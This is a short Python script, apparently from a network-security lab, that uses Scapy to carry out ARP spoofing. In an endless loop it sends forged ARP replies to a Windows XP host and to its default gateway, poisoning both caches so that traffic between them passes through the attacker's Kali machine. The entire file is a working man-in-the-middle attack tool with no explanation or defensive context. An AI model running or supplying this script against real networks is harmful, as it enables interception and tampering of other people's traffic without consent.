import time
from scapy.all import *


Kali_mac = "00:00:00:00:00:04"
Default_gateway_mac = "00:00:00:00:00:03"
XP_IP = "10.10.111.101"
XP_mac = "00:00:00:00:00:05"
Default_gateway_IP = "10.10.111.1"
i=1
unsolicited_arp1 = Ether(src=Kali_mac, dst=XP_mac)/ARP(op="is-at", psrc=Default_gateway_IP, pdst=XP_IP, hwsrc=Kali_mac)
unsolicited_arp2 = Ether(src=Kali_mac, dst=Default_gateway_mac)/ARP(op="is-at", psrc=XP_IP, pdst=Default_gateway_IP, hwsrc=Kali_mac)

while 1:
	sendp(unsolicited_arp1)
	sendp(unsolicited_arp2)
	
	print ("This is the:  "+str(i)+"  round\n")
	time.sleep(3)	
	i=i+1	
